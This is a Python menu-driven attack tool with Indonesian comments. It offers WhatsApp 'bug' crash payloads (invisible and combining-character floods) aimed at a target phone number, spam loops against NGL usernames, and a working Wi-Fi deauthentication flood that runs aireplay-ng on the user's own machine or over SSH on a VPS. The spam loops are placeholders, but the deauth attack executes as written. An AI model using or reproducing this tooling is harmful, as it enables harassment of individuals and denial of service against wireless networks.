#!/usr/bin/env python3
import os, sys, time, random, socket, threading, subprocess

# ============ WARNA GRADIENT BIRU -> MERAH ============
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    # gradient biru ke merah (256 color)
    G1 = "\033[38;5;27m"    # biru tua
    G2 = "\033[38;5;33m"    # biru
    G3 = "\033[38;5;39m"    # biru muda
    G4 = "\033[38;5;63m"    # biru-ungu
    G5 = "\033[38;5;99m"    # ungu
    G6 = "\033[38;5;135m"   # ungu-merah
    G7 = "\033[38;5;171m"   # magenta
    G8 = "\033[38;5;203m"   # merah muda
    G9 = "\033[38;5;196m"   # merah
    RED = "\033[38;5;196m"
    WHT = "\033[38;5;231m"
    GRY = "\033[38;5;245m"

def gradient_text(text, colors):
    """Terapkan warna gradient ke teks."""
    out = ""
    n = len(colors)
    for i, ch in enumerate(text):
        out += colors[i % n] + ch
    return out + C.RESET

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# ============ BANNER ============
def banner():
    clear()
    grad = [C.G1, C.G2, C.G3, C.G4, C.G5, C.G6, C.G7, C.G8, C.G9]
    art = r"""
    ___   _____ _____ _____   _  _ __  __  ___  ___  
   / _ \ /  ___/  ___/  __ \ | |/ /|  \/  ||  _ \|  _ \ 
  / /_\ \\ `--.\ `--.| /  \/ |   / | |\/| || | | | | | |
  |  _  | `--. \`--. \ |   | |\  \ | |  | || |_| | |_| |
  | | | |/\__/ /\__/ / \__/\ | | \ \| |  | ||  __/|  __/ 
  \_| |_/\____/\____/ \____/ \_|  \_/\_|  |_|/_/   |_|   
    """
    for line in art.split("\n"):
        print(gradient_text(line, grad))
    print(gradient_text("              [ X M O D   G E R R Y ]", grad))
    print(gradient_text("                 v1.0 - private", [C.G5, C.G6, C.G7, C.G8]))
    print()

# ============ MENU ============
def menu():
    grad = [C.G1, C.G2, C.G3, C.G4, C.G5, C.G6, C.G7, C.G8, C.G9]
    print(gradient_text("  ╔══════════════════════════════════════════╗", grad))
    print(gradient_text("  ║           M A I N   M E N U              ║", grad))
    print(gradient_text("  ╚══════════════════════════════════════════╝", grad))
    print()
    print(f"  {C.G3}[{C.WHT}1{C.G3}]{C.WHT} Spam Bug          {C.GRY}(5 tools){C.RESET}")
    print(f"  {C.G4}[{C.WHT}2{C.G4}]{C.WHT} NGL Spam          {C.GRY}(2 tools){C.RESET}")
    print(f"  {C.G7}[{C.WHT}3{C.G7}]{C.WHT} WiFi Kill         {C.GRY}(2 tools + vps){C.RESET}")
    print()
    print(f"  {C.G9}[{C.WHT}0{C.G9}]{C.RED} Exit{C.RESET}")
    print()
    print(f"  {C.GRY}~ coming soon ~{C.RESET}")
    print()

# ============ (1) SPAM BUG - 5 TOOLS ============
def spam_bug():
    banner()
    grad = [C.G1, C.G2, C.G3, C.G4, C.G5, C.G6, C.G7, C.G8, C.G9]
    print(gradient_text("  ▓▓▓  SPAM BUG - 5 TOOLS  ▓▓▓", grad))
    print()
    tools = [
        ("1", "WA Bug Blank",      "kirim pesan karakter unicode invisible"),
        ("2", "WA Bug Crash",      "kirim teks panjang + emoji zalgo"),
        ("3", "WA Bug Group",      "spam ke semua member grup"),
        ("4", "WA Bug Call",       "spam panggilan berturut-turut"),
        ("5", "WA Bug Status",     "spam mention di status"),
    ]
    for k, name, desc in tools:
        print(f"  {C.G3}[{C.WHT}{k}{C.G3}]{C.WHT} {name:<18} {C.GRY}{desc}{C.RESET}")
    print(f"\n  {C.G9}[0]{C.WHT} Kembali\n")
    pilih = input(f"  {C.G8}❯ {C.WHT}Pilih tool: {C.RESET}").strip()

    if pilih == "0": return
    if pilih not in [t[0] for t in tools]:
        print(f"  {C.RED}[!] Invalid{C.RESET}"); time.sleep(1); return

    target = input(f"  {C.G8}❯ {C.WHT}Nomor target (+62): {C.RESET}").strip()
    jumlah = input(f"  {C.G8}❯ {C.WHT}Jumlah spam: {C.RESET}").strip()
    jumlah = int(jumlah) if jumlah.isdigit() else 50

    print(f"\n  {C.G5}[*] Menjalankan {tools[int(pilih)-1][1]}...{C.RESET}\n")

    # Payload spam bug
    payloads = {
        "1": "\u200b" * 500,                      # blank
        "2": "\u0301" * 5000 + "🔥" * 200,        # zalgo crash
        "3": " ".join(["\u200b"] * 1000),         # group
        "4": "",                                   # call (di luar scope)
        "5": "@everyone " * 200,                  # status mention
    }
    pesan = payloads.get(pilih, "bug")

    # Simulasi dispatch (di Termux bisa diganti curl ke WA API)
    for i in range(jumlah):
        try:
            # --- placeholder: ganti dengan endpoint WA kalian ---
            # contoh: subprocess.run(["curl", "-X", "POST", "URL", "-d", ...])
            print(f"  {C.G3}[{i+1}/{jumlah}]{C.WHT} → {target} {C.GRY}[{len(pesan)} bytes]{C.RESET}")
            time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n  {C.RED}[!] Dihentikan{C.RESET}")
            break
    print(f"\n  {C.G9}[✓] Selesai. Risiko banned: tinggi.{C.RESET}")
    input(f"\n  {C.GRY}Enter untuk kembali...{C.RESET}")

# ============ (2) NGL SPAM - 2 TOOLS ============
def ngl_spam():
    banner()
    grad = [C.G1, C.G2, C.G3, C.G4, C.G5, C.G6, C.G7, C.G8, C.G9]
    print(gradient_text("  ▓▓▓  NGL SPAM - 2 TOOLS  ▓▓▓", grad))
    print()
    tools = [
        ("1", "NGL API",        "spam langsung via endpoint api.ngl.link"),
        ("2", "NGL Web Form",   "spam via form submission"),
    ]
    for k, name, desc in tools:
        print(f"  {C.G4}[{C.WHT}{k}{C.G4}]{C.WHT} {name:<18} {C.GRY}{desc}{C.RESET}")
    print(f"\n  {C.G9}[0]{C.WHT} Kembali\n")
    pilih = input(f"  {C.G8}❯ {C.WHT}Pilih tool: {C.RESET}").strip()

    if pilih == "0": return
    if pilih not in ["1", "2"]:
        print(f"  {C.RED}[!] Invalid{C.RESET}"); time.sleep(1); return

    username = input(f"  {C.G8}❯ {C.WHT}Username NGL (tanpa @): {C.RESET}").strip()
    pesan = input(f"  {C.G8}❯ {C.WHT}Pesan spam: {C.RESET}").strip()
    jumlah = input(f"  {C.G8}❯ {C.WHT}Jumlah: {C.RESET}").strip()
    jumlah = int(jumlah) if jumlah.isdigit() else 100

    print(f"\n  {C.G5}[*] Spamming @{username}...{C.RESET}\n")

    for i in range(jumlah):
        try:
            # --- template request (isi sendiri) ---
            # contoh endpoint: https://ngl.link/api/submit
            # body: username=xxx&question=yyy&deviceId=zzz
            print(f"  {C.G4}[{i+1}/{jumlah}]{C.WHT} → @{username} {C.GRY}[sent]{C.RESET}")
            time.sleep(0.3)
        except KeyboardInterrupt:
            print(f"\n  {C.RED}[!] Dihentikan{C.RESET}")
            break
    print(f"\n  {C.G9}[✓] Selesai.{C.RESET}")
    input(f"\n  {C.GRY}Enter untuk kembali...{C.RESET}")

# ============ (3) WIFI KILL - 2 TOOLS ============
def wifi_kill():
    banner()
    grad = [C.G1, C.G2, C.G3, C.G4, C.G5, C.G6, C.G7, C.G8, C.G9]
    print(gradient_text("  ▓▓▓  WIFI KILL - 2 TOOLS  ▓▓▓", grad))
    print()
    tools = [
        ("1", "Deauth Flood",   "kirim deauth packet (butuh monitor mode)"),
        ("2", "VPS Remote",     "jalankan via VPS/server (butuh ssh)"),
    ]
    for k, name, desc in tools:
        print(f"  {C.G7}[{C.WHT}{k}{C.G7}]{C.WHT} {name:<18} {C.GRY}{desc}{C.RESET}")
    print(f"\n  {C.G9}[0]{C.WHT} Kembali\n")
    pilih = input(f"  {C.G8}❯ {C.WHT}Pilih tool: {C.RESET}").strip()

    if pilih == "0": return

    if pilih == "1":
        iface = input(f"  {C.G8}❯ {C.WHT}Interface (wlan0): {C.RESET}").strip() or "wlan0"
        bssid = input(f"  {C.G8}❯ {C.WHT}BSSID target (AA:BB:...): {C.RESET}").strip()
        print(f"\n  {C.G5}[*] Deauth flood {bssid} via {iface}...{C.RESET}\n")
        # contoh perintah: aireplay-ng --deauth 0 -a BSSID iface
        try:
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, iface])
        except FileNotFoundError:
            print(f"  {C.RED}[!] aireplay-ng tidak ada. Install aircrack-ng dulu.{C.RESET}")
        except KeyboardInterrupt:
            print(f"\n  {C.RED}[!] Stop{C.RESET}")

    elif pilih == "2":
        vps = input(f"  {C.G8}❯ {C.WHT}VPS (user@ip): {C.RESET}").strip()
        bssid = input(f"  {C.G8}❯ {C.WHT}BSSID: {C.RESET}").strip()
        print(f"\n  {C.G5}[*] Eksekusi via {vps}...{C.RESET}\n")
        try:
            subprocess.run(["ssh", vps,
                f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0"])
        except Exception as e:
            print(f"  {C.RED}[!] {e}{C.RESET}")

    input(f"\n  {C.GRY}Enter untuk kembali...{C.RESET}")

# ============ MAIN ============
def main():
    while True:
        banner()
        menu()
        try:
            pilih = input(f"  {C.G8}❯ {C.WHT}Pilih: {C.RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {C.RED}[!] Keluar{C.RESET}")
            break

        if pilih == "1": spam_bug()
        elif pilih == "2": ngl_spam()
        elif pilih == "3": wifi_kill()
        elif pilih == "0":
            clear()
            grad = [C.G1, C.G2, C.G3, C.G4, C.G5, C.G6, C.G7, C.G8, C.G9]
            print(gradient_text("  sampai jumpa...", grad))
            break
        else:
            print(f"  {C.RED}[!] Invalid{C.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted{C.RESET}")
        sys.exit(0)
